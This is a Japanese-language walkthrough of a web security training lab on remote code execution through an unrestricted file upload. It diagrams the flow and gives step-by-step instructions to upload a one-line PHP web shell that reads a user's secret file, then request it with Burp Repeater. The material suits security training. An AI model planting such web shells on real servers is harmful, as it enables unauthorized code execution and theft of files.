### Lab: Remote code execution via web shell upload


## 🌐 Webシェルの流れ



```

😈 攻撃者&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　&nbsp;&nbsp;&nbsp;🖥️ サーバー📁 /files/avatars/

                                                       


① exploit.phpをアップロード
────────────────────────────────────────────────────────────────────────────▶  
exploit.php を保存
 ✅ 保存完了！

② GETリクエストを送る
GET /files/avatars/exploit.php
────────────────────────────────────────────────────────────────────────────▶  

                                                               ③ PHPファイルを実行
                                                          <?php echo file_get_contents('/home/carlos/secret'); ?>
                                                                 ↓
                                                               ④ carlosのファイルを読み込む
                                                                📄 /home/carlos/secret
                                                                  中身: abc123xyz
                                                                 ↓
                                                               ⑤ echo で出力

◀────────────────────────────────────────────────────────────────────────────  
⑥ Burpに結果が返ってくる
   abc123xyz...

```

ポイント：
・攻撃者がリクエストを「投げる」
・サーバーが勝手にPHPを「実行」してしまう
・結果が攻撃者に「返ってくる」

## Step 1: exploit.php を作る

1. メモ帳を開く
2. 以下をコピペ：```<?php echo file_get_contents('/home/carlos/secret'); ?>```
3. 「名前を付けて保存」
4. ファイルの種類を **「すべてのファイル」** に変更
5. ファイル名を `exploit.php` にして保存

---

## Step 2: アップロード

1. My Accountページで「ファイルを選択」
2. `exploit.php` を選ぶ
3. **Upload** を押す
4. Burpのレスポンスに `exploit.php has been uploaded` と出ることを確認

---

## Step 3: Repeaterで実行

1. Burpの **Repeater タブ** を開く
2. 以下を入力：
```
GET /files/avatars/exploit.php HTTP/2
Host: 0a0300b704669de1816bc5ba004a002e.web-security-academy.net
```
3. **Send** を押す
4. レスポンスに秘密の文字列が出る！

---
